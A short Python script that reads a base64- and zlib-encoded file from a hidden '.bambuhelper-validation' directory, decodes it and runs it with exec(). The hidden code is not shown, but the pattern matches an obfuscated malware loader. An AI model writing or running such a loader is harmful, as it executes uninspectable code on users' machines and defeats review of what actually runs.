#!/usr/bin/env python3
from pathlib import Path
import base64, zlib

payload = Path(__file__).resolve().parent / '.bambuhelper-validation' / 'v11_2_workshop_tools_verified.zlib.b64'
encoded = payload.read_text().strip()
encoded += '=' * (-len(encoded) % 4)
source = zlib.decompress(base64.b64decode(encoded))
exec(compile(source, str(payload) + ':decoded', 'exec'))
